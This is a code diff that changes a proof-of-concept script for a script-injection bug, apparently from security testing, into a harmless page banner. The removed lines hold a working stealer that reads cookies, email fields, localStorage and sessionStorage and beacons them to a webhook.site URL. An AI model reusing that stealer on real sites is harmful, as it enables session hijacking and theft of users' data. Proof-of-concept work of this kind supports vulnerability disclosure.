@@ -1,44 +1,45 @@
-// impact_test.js
-// PoC for inAuthScript host injection — run only on authorized test accounts
-// Replace webhook id if you want a different one.
+// impact_dom_only.js — harmless DOM-only PoC
+console.log("DOM-only PoC loaded");
 
-// Log for console proof
-console.log("Impact PoC loaded from GH Pages");
-
-// Try to read non-HttpOnly cookies
-var cookieData = document.cookie || "NO_COOKIE_AVAILABLE";
-
-// Try to read common places where tokens/emails might be visible in DOM
-var possibleEmail = "";
+// insert visible banner on top of the page
 try {
-  var el = document.querySelector('input[type="email"], input[name="email"], [data-user-email]');
-  if (el) {
-    possibleEmail = (el.value && el.value.trim()) || (el.textContent && el.textContent.trim()) || "";
-  }
-} catch (e) {
-  // ignore
+  var banner = document.createElement('div');
+  banner.id = 'inAuthPoCBanner';
+  banner.style.position = 'fixed';
+  banner.style.left = '0';
+  banner.style.top = '0';
+  banner.style.width = '100%';
+  banner.style.zIndex = '2147483647';
+  banner.style.padding = '10px';
+  banner.style.fontSize = '14px';
+  banner.style.textAlign = 'center';
+  banner.style.boxShadow = '0 2px 4px rgba(0,0,0,0.2)';
+  banner.style.background = 'linear-gradient(90deg, #ffdd57, #ff9a57)';
+  banner.textContent = 'inAuth PoC: external script executed (harmless)';
+  document.documentElement.appendChild(banner);
+
+  // remove banner after 12 seconds to be polite
+  setTimeout(function(){ 
+    var b = document.getElementById('inAuthPoCBanner');
+    if (b && b.parentNode) b.parentNode.removeChild(b);
+  }, 12000);
+} catch(e) {
+  console.log("PoC banner failed:", e);
 }
 
-// Try localStorage/sessionStorage (if anything interesting stored)
-var ls = "";
-try { ls = JSON.stringify(window.localStorage || {}); } catch(e) { ls = "LS_ERROR"; }
-var ss = "";
-try { ss = JSON.stringify(window.sessionStorage || {}); } catch(e) { ss = "SS_ERROR"; }
-
-// Build small payload (keep length reasonable)
-var payload = [
-  "cookie=" + encodeURIComponent(cookieData),
-  "email=" + encodeURIComponent(possibleEmail),
-  "localStorage=" + encodeURIComponent(ls.slice(0,2000)),   // truncate to avoid huge URL
-  "sessionStorage=" + encodeURIComponent(ss.slice(0,2000)),
-].join("&");
-
-// Send as image beacon to webhook.site (your webhook id)
-var beaconUrl = "https://webhook.site/0535ca62-3583-48a2-896d-d18863722cfb?" + payload + "&ts=" + Date.now();
-
-// Fire beacon
-new Image().src = beaconUrl;
-
-// Console confirm for local verification
-console.log("Impact PoC payload attempted to send:", payload);
-console.log("Beacon URL (truncated):", beaconUrl.slice(0,200));
+// small DOM change as additional visual proof
+try {
+  var p = document.createElement('p');
+  p.id = 'inAuthPoCNote';
+  p.style.position = 'fixed';
+  p.style.right = '10px';
+  p.style.bottom = '10px';
+  p.style.background = 'rgba(0,0,0,0.6)';
+  p.style.color = '#fff';
+  p.style.padding = '6px 8px';
+  p.style.borderRadius = '6px';
+  p.style.zIndex = '2147483647';
+  p.textContent = 'PoC script loaded from external host';
+  document.body.appendChild(p);
+  setTimeout(function(){ var n=document.getElementById('inAuthPoCNote'); if(n&&n.parentNode) n.parentNode.removeChild(n); }, 12000);
+} catch(e) {}
